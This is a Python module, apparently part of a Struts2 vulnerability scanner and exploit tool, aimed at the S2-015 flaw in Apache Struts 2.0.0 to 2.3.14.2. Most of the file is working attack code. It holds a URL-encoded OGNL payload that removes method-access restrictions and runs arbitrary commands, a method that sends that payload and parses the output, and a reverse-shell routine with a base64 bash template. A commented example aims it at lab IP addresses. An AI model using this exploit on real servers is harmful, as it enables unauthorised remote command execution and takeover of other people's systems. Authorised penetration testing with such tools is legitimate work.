from exploit import tools
import urllib.parse
import re
from bs4 import BeautifulSoup

class S2_015:
    """S2-015漏洞检测利用类"""
    info = "[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹Linux shell"
    exec_payload = "%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            rindex = url.rindex('/')
            self.url = url[:rindex + 1]
        elif url.endswith("/"):
            self.url = url
        else:
            self.url = url + '/'
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = tools.echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-015'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=urllib.parse.quote(cmd))
        html = tools.get(self.url + "{payload}.action".format(payload=payload), self.headers, self.encoding)
        if html.startswith('ERROR:'):
            return html
        try:
            soup = BeautifulSoup(html, 'lxml')
            soup_result = soup.find_all('p')
            pattern = re.compile(r'(?<=</b>.)(.*)(?=..jsp)', re.S)
            message = ''.join(str(tag) for tag in soup_result if "Message" in str(tag))
            result = ''.join(re.findall(pattern, message))
            return result
        except Exception as e:
            return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_015("http://192.168.217.138:8080/S2-015/param.action")
#     print(s.check())
#     print(s.exec_cmd('ls -la'))
#     s.reverse_shell('192.168.3.134', '8888')